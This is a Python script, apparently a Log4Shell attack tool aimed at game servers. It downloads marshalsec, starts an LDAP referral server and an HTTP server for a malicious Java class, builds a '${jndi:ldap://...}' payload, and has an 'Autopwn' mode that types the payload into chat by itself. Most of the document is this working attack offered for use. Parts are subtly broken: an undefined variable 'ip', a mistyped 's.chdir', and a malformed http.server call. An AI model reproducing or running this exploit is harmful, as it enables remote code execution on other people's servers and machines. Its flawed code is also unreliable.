import time
import os
import pyautogui
import glob
import asyncio

print((("""
     ...                                                                                          ..       .. 
  .zf"` `"tu                                   xeee           .         .uef^"               x .d88"  x .d88"  
 x88      '8N.        u.                      d888R           E       :d88E                   5888R    5888R   
 888k     d88&  ...ue888b       uL           d8888R        .x+E:..    `888E            .u     '888R    '888R   
 8888N.  @888F  888R Y888r  .ue888Nc..      @ 8888R      u8~  E  `b.   888E .z8k    ud8888.    888R     888R   
 `88888 9888%   888R I888> d88E`"888E`    .P  8888R     t8E   E d888>  888E~?888L :888'8888.   888R     888R   
   %888 "88F    888R I888> 888E  888E    :F   8888R     88N.  E'8888~  888E  888E d888 '88%"   888R     888R   
    8"   "*h=~  888R I888> 888E  888E   x"    8888R     88888b&.`""`   888E  888E 8888.+"      888R     888R   
  z8Weu        u8888cJ888  888E  888E  d8eeeee88888eer  '88888888e.    888E  888E 8888L        888R     888R   
 ""88888i.   Z  "*888*P"   888& .888E         8888R       "*8888888N   888E  888E '8888c. .+  .888B .  .888B . 
"   "8888888*     'Y"      *888" 888&         8888R      uu. ^8*8888E m888N= 888>  "88888%    ^*888%   ^*888%  
      ^"**""                `"   "888E     "*%%%%%%**~  @888L E `"88E  `Y"   888     "YP'       "%       "%    
                           .dWi   `88E                 '8888~ E   98~       J88"                               
                           4888~  J8%                   `*.   E  .*"        @%                                 
                            ^"===*"`                      `~==R=~`        :"        by TheUnsocialEngineer                
""")))

payload=()
connectip=()
connectport=()
httport=()
automatic=False

if not os.path.exists("payloads"):
    os.makedirs("payloads")
if not os.path.exists("marshalsec"):
    print("downloading marshalsec")
    os.popen("git clone https://github.com/mbechler/marshalsec")
else:
    print("precs found skipping setup")


def autorun():
    if automatic==True:
        async def refer():
            print(f"starting referral server on {connectport}")
            os.chdir("marshalsec/src")
            os.popen(f'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{connectip}:{httport}/#{payload}"')
        async def http():
            print(f"starting http server on {httport}")
            os.popen(f"python3 http.server {httport}")

        asyncio.run(http())
        asyncio.run(refer())
            
        time.sleep(5)
        pyautogui.press("/")
        pyautogui.press("backspace")
        pyautogui.write(completedpayload)
        pyautogui.press("enter")

start=input("press 1 to start or 2 to exit:")
if start=="1":
    mode=input("Select Mode Manual/Autopwn, M/A:")
    if mode =="M" or mode=="m":
        os.chdir("payloads")
        for file in glob.glob("*.class"):
            print(file)
            choice=input("choose payload:")
            payload=(choice.replace(".class",""))
            print(f"you have chosen {choice}.... continuing")
            connectip=input("enter your ip:")
            connectport=input("enter connecting port:")
            httport=input("enter the port to host the payload on:")
            payloadstring=str(connectip+":"+connectport+"/"+payload)
            completedpayload=("${jndi:ldap://"+payloadstring+"}")
            print(f"your payload is {completedpayload}")
            automate=input("do you want to automate the payload sending and setup Y/N:")
            if automate =="Y" or automate=="y":
                automatic=True
                os.chdir("../")
                autorun()
            else:
                if automate =="N" or mode=="n":
                    automatic=False
                    print("you wll manually need to setup the http and refer servers as well as send the payload in chat")   
    else:
        if mode=="A" or mode =="a":
            os.chdir("payloads")
            payload=("Log4jRCE")
            print(f"setting payload to {payload}")
            connectip=("192.168.1.183")
            print(f"setting ip to {ip}")
            connectport=("1389")
            print(f"setting connection port to {connectport}")
            httport=("8903")
            print(f"setting httport to {httport}")
            payloadstring=str(connectip+":"+connectport+"/"+payload)
            completedpayload=("${jndi:ldap://"+payloadstring+"}")
            print(f"your payload is {completedpayload}")
            automatic=True
            s.chdir("../")
            autorun()
        else:
            print("not an option")
            exit()
else:
    if start=="2":
        exit()
    else:
        print("not an option")
        exit()
